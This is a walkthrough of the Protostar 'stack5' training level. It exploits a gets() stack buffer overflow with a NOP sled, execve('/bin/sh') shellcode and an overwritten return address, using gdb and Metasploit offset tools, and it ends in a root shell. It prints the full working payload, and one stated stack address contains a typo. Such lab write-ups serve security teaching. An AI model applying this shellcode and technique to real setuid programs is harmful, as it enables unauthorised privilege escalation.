# Protostar - Stack5
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack5__
* About
  Stack5 is a standard buffer overflow, this time introducing shellcode.

  This level is at /opt/protostar/bin/stack5

  Hints
    * At this point in time, it might be easier to use someone elses shellcode
    * If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
    * remove the int3s once your shellcode is done.


* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}

```
   
  Now, we will not point EIP to somewhere else but we will place our shell code on to the stack an point EIP to our shellcode to get shell when the program return.

  First, we have to see what is the exact position of EIP by using pattern_create.rb
```
root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
(gdb) run
Starting program: /opt/protostar/bin/stack5 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 
```

```
root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```

  The exect position is 76. So we can construct our payload without shellcode, The BBBB was supposed to be address stack that contain our input buffer.
  > python -c 'print("A"*(76) + "BBBB")' | /opt/protostar/bin/stack5

  We have to find 2 more thing, the first one is the shellcode. I use generic 49-byte shellcode.
```
\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42
```

  Due to the length of shellcode is 49 bytes so we have to decrease number of dummy character (76 - 49 = 27)
  > python -c 'print("A"*(27) + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "BBBB")' | /opt/protostar/bin/stack5

  I'll change "A"s to "\x90" which mean do nothing in assembly language to increase chance that the EIP will land to our shellcode.
  > python -c 'print("\x90"*(27) + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "BBBB")' | /opt/protostar/bin/stack5

  The last thing we must findout is where is the address of stack that we will force EIP to point to. For this step I'll use GDB to debug and find where is address of the stack that contain buffer.

```
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
(gdb) b *main+21
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) run 
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff884) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/40xw $esp
0xbffff780:     0xbffff790      0xb7ec6165      0xbffff798      0xb7eada75
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7d0:     0x08004141      0x00000000      0xbffff858      0xb7eadc76
0xbffff7e0:     0x00000001      0xbffff884      0xbffff88c      0xb7fe1848
0xbffff7f0:     0xbffff840      0xffffffff      0xb7ffeff4      0x08048232
0xbffff800:     0x00000001      0xbffff840      0xb7ff0626      0xb7fffab0
0xbffff810:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
(gdb) 
```

  The address is between 0xbffff790 to 0xbffff7d2. So let use 0xbffff7490 (don't forget to reverse the address to \x90\xf7\xff\xbf)
  > python -c 'print("\x90"*(27) + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90\xf7\xff\xbf")' > /tmp/exploit5

```
(gdb) run < /tmp/exploit5 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exploit5

Breakpoint 1, main (argc=0, argv=0xbffff884) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) c
Continuing.
Executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.

Program exited normally.
```

What? how can this suppose to happen, after spend many days to findout what's going wrong. I've found that we could run the shellcode in another way to exploit vulnerable program outside GDB refer to this [link](https://security.stackexchange.com/questions/73878/program-exiting-after-executing-int-0x80-instruction-when-running-shellcode).

```
user@protostar:~$ cat /tmp/exploit5 - | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
^C
user@protostar:~$ whoami
user
```

### _Solution_
```
python -c 'print("\x90"*(76-49) + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90\xf7\xff\xbf")' > /tmp/exploit5
```

```
user@protostar:~$ cat /tmp/exploit5 - | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
^C
user@protostar:~$ whoami
user
```

